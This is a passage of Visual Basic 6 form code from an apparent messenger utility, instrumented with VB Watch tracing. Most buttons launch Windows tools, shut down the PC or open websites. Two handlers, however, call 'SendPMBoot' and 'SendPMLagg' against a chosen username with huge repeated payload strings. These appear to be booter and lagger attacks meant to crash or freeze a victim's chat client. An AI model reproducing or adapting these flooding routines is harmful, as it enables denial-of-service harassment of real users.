If vbwTraceLine Then vbwExecuteLine False, "58     Call Shell(" & Chr(34) & "rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,3" & Chr(34) & ", 1)"
' </VB WATCH>
58     Call Shell("rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,3", 1)

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
59         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
60         Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "properties_Click"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

Private Sub regedit_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("regedit.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub

Private Sub sadffff_Click()
Call ANTI
Call SendPMBoot(unseen.Text1.Text, "<b>Sh¦ftY                   www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www. www.", True, True)
End Sub

Private Sub scan_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("scandisk.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub

Private Sub sDASDASD_Click()
Call SendPMLagg(unseen.Text1.Text, "X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(X-(", True, 25)
End Sub

Private Sub shutdown_Click()
' <VB WATCH>
61         On Error GoTo vbwErrHandler
62         Const VBWPROCNAME = "Form1.shutdown_Click"
63         If vbwTraceProc Then
64             Dim vbwParameterString As String
65             If vbwTraceParameters Then
66                 vbwParameterString = "()"
67             End If
68             vbwTraceIn VBWPROCNAME, vbwParameterString
69         End If
' </VB WATCH>
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "70     Call Shell(" & Chr(34) & "Rundll32.exe user,exitwindows" & Chr(34) & ")"
' </VB WATCH>
70     Call Shell("Rundll32.exe user,exitwindows")

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "End Sub"
71         If vbwTraceProc Then vbwTraceOut VBWPROCNAME
72         Exit Sub
    ' ----- Error Handler ------
vbwErrHandler:
    Const VBWPROCEDURE = "shutdown_Click"
    Select Case MsgBox("Error " & Err.number & vbCrLf & _
                      Err.Description & vbCrLf & _
                     "Location: " & VBWPROJECT & "." & VBWMODULE & "." & VBWPROCEDURE & vbCrLf & _
                     "Line " & Erl, _
                     vbAbortRetryIgnore)
      Case vbAbort
          End
      Case vbRetry
          Resume
      Case vbIgnore
          Resume Next
  End Select

If vbwTraceLine Then vbwExecuteLine False, "End Sub"
    If vbwTraceProc Then vbwTraceOut VBWPROCNAME
' </VB WATCH>
End Sub

' <VB WATCH> <VBWATCHFINALPROC>
' Procedure added by VB Watch
Private Sub Form_Initialize()
    If vbwInstanceCount Then vbwNewInstance VBWMODULE, vbwInstanceID
End Sub
' </VB WATCH>
' <VB WATCH> <VBWATCHFINALPROC>
' Procedure added by VB Watch
Private Sub Form_Terminate()
    If vbwInstanceCount Then vbwKillInstance VBWMODULE, vbwInstanceID
End Sub

Private Sub sol_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("sol.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub


' </VB WATCH>
Private Sub winmine_Click()
 Dim iTask As Long, Ret As Long, pHandle As Long
    iTask = Shell("winmine.exe", vbNormalFocus)
    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
    Ret = WaitForSingleObject(pHandle, INFINITE)
    Ret = CloseHandle(pHandle)

End Sub

Private Sub wizard_Click()
MsgBox "Same Again Don't Know For XP But I'm Sure You Can Sort That Out", vbInformation, "Next Gen"
' Dim iTask As Long, Ret As Long, pHandle As Long
'    iTask = Shell("tuneup.exe", vbNormalFocus)
'    pHandle = OpenProcess(SYNCHRONIZE, False, iTask)
'    Ret = WaitForSingleObject(pHandle, INFINITE)
'    Ret = CloseHandle(pHandle)

End Sub

Private Sub shifty_Click()
retVal = Shell("Start.exe http://shifty.maxivb.com", vbHide)
End Sub

Private Sub yahoo_Click()
retVal = Shell("Start.exe http://www.yahoo.com", vbHide)

End Sub

